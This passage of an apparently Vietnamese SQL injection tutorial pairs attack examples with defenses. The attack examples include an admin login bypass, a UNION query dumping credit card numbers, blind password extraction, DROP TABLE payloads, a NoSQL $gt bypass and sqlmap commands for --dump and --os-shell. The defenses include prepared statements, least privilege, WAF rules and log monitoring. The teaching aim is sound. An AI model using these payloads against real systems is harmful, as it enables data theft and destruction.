+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> username <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>admin<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span>&#39; AND password = &#39;anything&#39;
+</span></span></code></pre>
+<p>Result: Đăng nhập thành công mà không cần password!</p>
+<h3 id="scenario-2-data-extraction-nightmare">Scenario 2: "Data Extraction Nightmare"<a class="zola-anchor" href="#scenario-2-data-extraction-nightmare" aria-label="Anchor link for: scenario-2-data-extraction-nightmare" style="visibility: hidden;"></a></h3>
+<p><strong>Vulnerable URL:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">https://shop.com/product?category=electronics
+</span></code></pre>
+<p><strong>Attack:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">https://shop.com/product?category=electronics&#39; UNION SELECT null,credit_card_number,null,null FROM payments--
+</span></code></pre>
+<p>Result: Tất cả credit card numbers được hiển thị trên trang sản phẩm!</p>
+<h3 id="scenario-3-time-based-blind-attack">Scenario 3: "Time-based Blind Attack"<a class="zola-anchor" href="#scenario-3-time-based-blind-attack" aria-label="Anchor link for: scenario-3-time-based-blind-attack" style="visibility: hidden;"></a></h3>
+<p>Khi không thể thấy output trực tiếp:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Kiểm tra độ dài password của admin
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> AND IF(LENGTH((SELECT password FROM users WHERE username=<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>admin<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>))&gt;10,SLEEP(5),0)--
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql">
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql">-- Kiểm tra từng ký tự
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">AND</span> IF(ASCII(<span class="z-support z-function z-string z-sql">SUBSTRING</span>((<span class="z-keyword z-other z-DML z-sql">SELECT</span> password <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> username<span class="z-keyword z-operator z-comparison z-sql">=</span><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>admin<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>),<span class="z-constant z-numeric z-sql">1</span>,<span class="z-constant z-numeric z-sql">1</span>))<span class="z-keyword z-operator z-comparison z-sql">&gt;</span><span class="z-constant z-numeric z-sql">65</span>,SLEEP(<span class="z-constant z-numeric z-sql">5</span>),<span class="z-constant z-numeric z-sql">0</span>)<span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span>
+</span></span></code></pre>
+<h2 id="advanced-sql-injection-techniques-ninja-level">Advanced SQL Injection Techniques: "Ninja Level"<a class="zola-anchor" href="#advanced-sql-injection-techniques-ninja-level" aria-label="Anchor link for: advanced-sql-injection-techniques-ninja-level" style="visibility: hidden;"></a></h2>
+<h3 id="second-order-sql-injection"><strong>Second-Order SQL Injection</strong><a class="zola-anchor" href="#second-order-sql-injection" aria-label="Anchor link for: second-order-sql-injection" style="visibility: hidden;"></a></h3>
+<p><em>"Kẻ thù nằm vùng"</em></p>
+<p>Input độc hại được lưu trữ trong database và executed sau đó:</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">// Lần 1: Lưu payload vào database
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">INSERT INTO users (username, email) VALUES (&#39;admin&#39;, &#39;test@test.com&#39;); DROP TABLE users;--&#39;)
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">// Lần 2: Khi query này chạy...
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">$query = &quot;SELECT * FROM logs WHERE user = &#39;&quot; . $user[&#39;username&#39;] . &quot;&#39;&quot;;
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">// Boom! Table users bị xóa
+</span></span></code></pre>
+<h3 id="nosql-injection"><strong>NoSQL Injection</strong><a class="zola-anchor" href="#nosql-injection" aria-label="Anchor link for: nosql-injection" style="visibility: hidden;"></a></h3>
+<p><em>"Thời đại mới, kỹ thuật mới"</em></p>
+<p>Với MongoDB:</p>
+<pre data-lang="javascript" class="language-javascript z-code"><code class="language-javascript" data-lang="javascript"><span class="z-source z-ts"><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Vulnerable</span>
+</span><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">db</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-object z-property z-ts">users</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">find</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">username</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-variable z-other z-object z-ts">req</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">body</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">username</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">password</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-variable z-other z-object z-ts">req</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">body</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">password</span></span><span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-meta z-brace z-round z-ts">)</span>
+</span><span class="z-source z-ts">
+</span><span class="z-source z-ts"><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Attack payload</span>
+</span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">  <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>username<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span>:<span class="z-meta z-objectliteral z-ts"> <span class="z-punctuation z-definition z-block z-ts">{</span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>$gt<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span><span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span><span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">  <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>password<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span>:<span class="z-meta z-objectliteral z-ts"> <span class="z-punctuation z-definition z-block z-ts">{</span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>$gt<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span><span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span><span class="z-punctuation z-definition z-block z-ts">}</span></span>
+</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span>
+</span></code></pre>
+<h3 id="polyglot-payloads"><strong>Polyglot Payloads</strong><a class="zola-anchor" href="#polyglot-payloads" aria-label="Anchor link for: polyglot-payloads" style="visibility: hidden;"></a></h3>
+<p><em>"Một mũi tên trúng nhiều đích"</em></p>
+<p>Payload hoạt động trên multiple database systems:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>||(SELECT CHR(65)||CHR(66)||CHR(67))||<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>
+</span></code></pre>
+<h2 id="phong-thu-build-your-defense-wall">Phòng Thủ: "Build Your Defense Wall"<a class="zola-anchor" href="#phong-thu-build-your-defense-wall" aria-label="Anchor link for: phong-thu-build-your-defense-wall" style="visibility: hidden;"></a></h2>
+<h3 id="parameterized-queries-prepared-statements"><strong>Parameterized Queries/Prepared Statements</strong><a class="zola-anchor" href="#parameterized-queries-prepared-statements" aria-label="Anchor link for: parameterized-queries-prepared-statements" style="visibility: hidden;"></a></h3>
+<p><em>"Giải pháp vàng"</em></p>
+<p><strong>Sai:</strong></p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">$query = &quot;SELECT * FROM users WHERE id = &quot; . $_GET[&#39;id&#39;];
+</span></span></code></pre>
+<p><strong>Đúng:</strong></p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">$stmt-&gt;execute([$_GET[&#39;id&#39;]]);
+</span></span></code></pre>
+<p><strong>Tại sao hiệu quả?</strong>
+SQL query structure được define trước, input chỉ là data, không thể thay đổi query logic.</p>
+<h3 id="input-validation-va-sanitization"><strong>Input Validation và Sanitization</strong><a class="zola-anchor" href="#input-validation-va-sanitization" aria-label="Anchor link for: input-validation-va-sanitization" style="visibility: hidden;"></a></h3>
+<p><em>"Kiểm tra kỹ trước khi tin tưởng"</em></p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">// Whitelist approach
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">if (!preg_match(&#39;/^[0-9]+$/&#39;, $_GET[&#39;id&#39;])) {
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    die(&#39;Invalid input&#39;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">}
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">// Escape special characters
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">$safe_input = mysqli_real_escape_string($connection, $_POST[&#39;username&#39;]);
+</span></span></code></pre>
+<h3 id="least-privilege-principle"><strong>Least Privilege Principle</strong><a class="zola-anchor" href="#least-privilege-principle" aria-label="Anchor link for: least-privilege-principle" style="visibility: hidden;"></a></h3>
+<p><em>"Đừng cho quyền admin cho người bán kẹo"</em></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Database user chỉ có quyền SELECT, INSERT, UPDATE
+</span></span><span class="z-source z-sql"><span class="z-keyword z-other z-authorization z-sql">GRANT</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span>, <span class="z-keyword z-other z-DML z-sql">INSERT</span>, <span class="z-keyword z-other z-DML z-sql">UPDATE</span> ON <span class="z-constant z-other z-database-name z-sql">myapp</span>.<span class="z-constant z-other z-table-name z-sql">users</span> TO <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>webapp<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>@<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>localhost<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>;
+</span><span class="z-source z-sql">
+</span><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Không cho quyền DROP, CREATE, ALTER
+</span></span><span class="z-source z-sql"><span class="z-keyword z-other z-authorization z-sql">REVOKE</span> DROP, CREATE, ALTER ON <span class="z-variable z-language z-star z-sql">*</span>.<span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>webapp<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>@<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>localhost<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>;
+</span></code></pre>
+<h3 id="web-application-firewall-waf"><strong>Web Application Firewall (WAF)</strong><a class="zola-anchor" href="#web-application-firewall-waf" aria-label="Anchor link for: web-application-firewall-waf" style="visibility: hidden;"></a></h3>
+<p><em>"Người gác cổng"</em></p>
+<p>Một số WAF rules:</p>
+<pre class="z-code"><code><span class="z-text z-plain"># Chặn common SQL injection patterns
+</span><span class="z-text z-plain">SecRule ARGS &quot;@detectSQLi&quot; &quot;phase:2,block,msg:&#39;SQL Injection Attack&#39;&quot;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"># Chặn UNION attacks
+</span><span class="z-text z-plain">SecRule ARGS &quot;@contains union&quot; &quot;phase:2,block&quot;
+</span></code></pre>
+<h3 id="error-handling"><strong>Error Handling</strong><a class="zola-anchor" href="#error-handling" aria-label="Anchor link for: error-handling" style="visibility: hidden;"></a></h3>
+<p><em>"Đừng tự tố mình"</em></p>
+<p><strong>Sai:</strong></p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">if (!$result) {
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    die(&#39;Error: &#39; . mysql_error()); // Lộ database structure
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">}
+</span></span></code></pre>
+<p><strong>Đúng:</strong></p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">if (!$result) {
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    error_log(&#39;Database error: &#39; . mysql_error());
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    die(&#39;An error occurred. Please try again.&#39;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">}
+</span></span></code></pre>
+<h2 id="testing-for-sql-injection-kiem-tra-hang-rao">Testing For SQL Injection: "Kiểm Tra Hàng Rào"<a class="zola-anchor" href="#testing-for-sql-injection-kiem-tra-hang-rao" aria-label="Anchor link for: testing-for-sql-injection-kiem-tra-hang-rao" style="visibility: hidden;"></a></h2>
+<h3 id="manual-testing-techniques">Manual Testing Techniques:<a class="zola-anchor" href="#manual-testing-techniques" aria-label="Anchor link for: manual-testing-techniques" style="visibility: hidden;"></a></h3>
+<p><strong>1. Single Quote Test:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">&#39; hoặc &quot;
+</span></code></pre>
+<p><strong>2. Numeric Test:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">1&#39; OR &#39;1&#39;=&#39;1
+</span><span class="z-text z-plain">1 OR 1=1
+</span></code></pre>
+<p><strong>3. Boolean Logic:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">&#39; OR 1=1--
+</span><span class="z-text z-plain">&#39; OR &#39;a&#39;=&#39;a
+</span></code></pre>
+<p><strong>4. Union Test:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">&#39; UNION SELECT null--
+</span><span class="z-text z-plain">&#39; UNION SELECT null,null--
+</span><span class="z-text z-plain">&#39; UNION SELECT null,null,null--
+</span></code></pre>
+<h3 id="automated-tools">Automated Tools:<a class="zola-anchor" href="#automated-tools" aria-label="Anchor link for: automated-tools" style="visibility: hidden;"></a></h3>
+<p><strong>SQLmap - "Rolls Royce của SQL injection":</strong></p>
+<pre data-lang="bash" class="language-bash z-code"><code class="language-bash" data-lang="bash"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Basic scan</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlmap</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://testsite.com/page?id=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Dump database</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlmap</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://testsite.com/page?id=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dump</span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Get OS shell</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlmap</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://testsite.com/page?id=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>os-shell</span></span>
+</span></code></pre>
+<p><strong>Burp Suite:</strong></p>
+<ul>
+<li>Intruder module cho automated testing</li>
+<li>SQLiPy extension cho advanced payloads</li>
+</ul>
+<h2 id="real-world-case-studies-nhung-vu-hack-noi-tieng">Real-world Case Studies: "Những Vụ Hack Nổi Tiếng"<a class="zola-anchor" href="#real-world-case-studies-nhung-vu-hack-noi-tieng" aria-label="Anchor link for: real-world-case-studies-nhung-vu-hack-noi-tieng" style="visibility: hidden;"></a></h2>
+<h3 id="heartland-payment-systems-2008"><strong>Heartland Payment Systems (2008)</strong><a class="zola-anchor" href="#heartland-payment-systems-2008" aria-label="Anchor link for: heartland-payment-systems-2008" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>Damage:</strong> 134 million credit cards compromised</li>
+<li><strong>Method:</strong> SQL injection vào web application</li>
+<li><strong>Loss:</strong> $140 million</li>
+</ul>
+<h3 id="sony-pictures-2011"><strong>Sony Pictures (2011)</strong><a class="zola-anchor" href="#sony-pictures-2011" aria-label="Anchor link for: sony-pictures-2011" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>Damage:</strong> 1 million user accounts</li>
+<li><strong>Method:</strong> Simple SQL injection</li>
+<li><strong>Embarrassing fact:</strong> Passwords stored in plain text</li>
+</ul>
+<h3 id="talktalk-2015"><strong>TalkTalk (2015)</strong><a class="zola-anchor" href="#talktalk-2015" aria-label="Anchor link for: talktalk-2015" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>Damage:</strong> 4 million customer records</li>
+<li><strong>Method:</strong> SQL injection by a 15-year-old</li>
+<li><strong>Loss:</strong> £77 million</li>
+</ul>
+<h2 id="sql-injection-trong-thoi-dai-hien-dai">SQL Injection Trong Thời Đại Hiện Đại<a class="zola-anchor" href="#sql-injection-trong-thoi-dai-hien-dai" aria-label="Anchor link for: sql-injection-trong-thoi-dai-hien-dai" style="visibility: hidden;"></a></h2>
+<h3 id="cloud-databases">Cloud Databases:<a class="zola-anchor" href="#cloud-databases" aria-label="Anchor link for: cloud-databases" style="visibility: hidden;"></a></h3>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> AWS RDS với encrypted storage vẫn có thể bị SQL injection
+</span></span><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Encryption chỉ protect data-at-rest, không protect từ application layer
+</span></span></code></pre>
+<h3 id="microservices-architecture">Microservices Architecture:<a class="zola-anchor" href="#microservices-architecture" aria-label="Anchor link for: microservices-architecture" style="visibility: hidden;"></a></h3>
+<pre class="z-code"><code><span class="z-text z-plain">API Gateway -&gt; Service A -&gt; Service B -&gt; Database
+</span><span class="z-text z-plain">     ↑              ↑
+</span><span class="z-text z-plain">   Potential      Potential
+</span><span class="z-text z-plain">   SQLi point     SQLi point
+</span></code></pre>
+<h3 id="graphql">GraphQL:<a class="zola-anchor" href="#graphql" aria-label="Anchor link for: graphql" style="visibility: hidden;"></a></h3>
+<pre data-lang="graphql" class="language-graphql z-code"><code class="language-graphql" data-lang="graphql"><span class="z-source z-graphql"><span class="z-keyword z-declaration z-query z-graphql">query</span> <span class="z-meta z-block z-graphql"><span class="z-punctuation z-section z-block z-begin z-graphql">{</span>
+</span></span><span class="z-source z-graphql"><span class="z-meta z-block z-graphql">  <span class="z-entity z-name z-field z-graphql">user</span><span class="z-punctuation z-section z-group z-begin z-graphql">(</span><span class="z-variable z-parameter z-graphql">id</span><span class="z-punctuation z-separator z-type z-graphql">:</span> <span class="z-string z-quoted z-double z-graphql"><span class="z-punctuation z-definition z-string z-begin z-graphql">&quot;</span>1; DROP TABLE users--<span class="z-punctuation z-definition z-string z-end z-graphql">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-graphql">)</span> <span class="z-meta z-block z-graphql"><span class="z-punctuation z-section z-block z-begin z-graphql">{</span>
+</span></span></span><span class="z-source z-graphql"><span class="z-meta z-block z-graphql"><span class="z-meta z-block z-graphql">    <span class="z-entity z-name z-field z-graphql">name</span>
+</span></span></span><span class="z-source z-graphql"><span class="z-meta z-block z-graphql"><span class="z-meta z-block z-graphql">    <span class="z-entity z-name z-field z-graphql">email</span>
+</span></span></span><span class="z-source z-graphql"><span class="z-meta z-block z-graphql"><span class="z-meta z-block z-graphql">  <span class="z-punctuation z-section z-block z-end z-graphql">}</span></span>
+</span></span><span class="z-source z-graphql"><span class="z-meta z-block z-graphql"><span class="z-punctuation z-section z-block z-end z-graphql">}</span></span>
+</span></code></pre>
+<h2 id="best-practices-kinh-nghiem-xuong-mau">Best Practices: "Kinh Nghiệm Xương Máu"<a class="zola-anchor" href="#best-practices-kinh-nghiem-xuong-mau" aria-label="Anchor link for: best-practices-kinh-nghiem-xuong-mau" style="visibility: hidden;"></a></h2>
+<h3 id="defense-in-depth"><strong>Defense in Depth</strong><a class="zola-anchor" href="#defense-in-depth" aria-label="Anchor link for: defense-in-depth" style="visibility: hidden;"></a></h3>
+<ul>
+<li>Input validation</li>
+<li>Parameterized queries</li>
+<li>WAF</li>
+<li>Database permissions</li>
+<li>Monitoring và logging</li>
+</ul>
+<h3 id="security-testing"><strong>Security Testing</strong><a class="zola-anchor" href="#security-testing" aria-label="Anchor link for: security-testing" style="visibility: hidden;"></a></h3>
+<pre data-lang="bash" class="language-bash z-code"><code class="language-bash" data-lang="bash"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Automated scanning</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlmap</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://yoursite.com/page?id=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Manual testing</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span> OR 1=1--
+</span></span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-string z-quoted z-single z-shell">&quot; OR &quot;1&quot;=&quot;1
+</span></span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-string z-quoted z-single z-shell">) OR (1=1
+</span></span></span></span></code></pre>
+<h3 id="code-review-checklist"><strong>Code Review Checklist</strong><a class="zola-anchor" href="#code-review-checklist" aria-label="Anchor link for: code-review-checklist" style="visibility: hidden;"></a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+Tất cả database queries đều sử dụng parameterized statements?</li>
+<li><input disabled="" type="checkbox"/>
+Input validation được implement đúng cách?</li>
+<li><input disabled="" type="checkbox"/>
+Error messages không lộ sensitive information?</li>
+<li><input disabled="" type="checkbox"/>
+Database user có least privilege?</li>
+</ul>
+<h3 id="monitoring-va-detection"><strong>Monitoring và Detection</strong><a class="zola-anchor" href="#monitoring-va-detection" aria-label="Anchor link for: monitoring-va-detection" style="visibility: hidden;"></a></h3>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Log suspicious queries
+</span></span><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> <span class="z-constant z-other z-database-name z-sql">mysql</span>.<span class="z-constant z-other z-table-name z-sql">general_log</span> <span class="z-keyword z-other z-DML z-sql">WHERE</span> argument <span class="z-keyword z-operator z-logical z-sql">LIKE</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>%UNION%<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">OR</span> argument <span class="z-keyword z-operator z-logical z-sql">LIKE</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>%DROP%<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>;
+</span><span class="z-source z-sql">
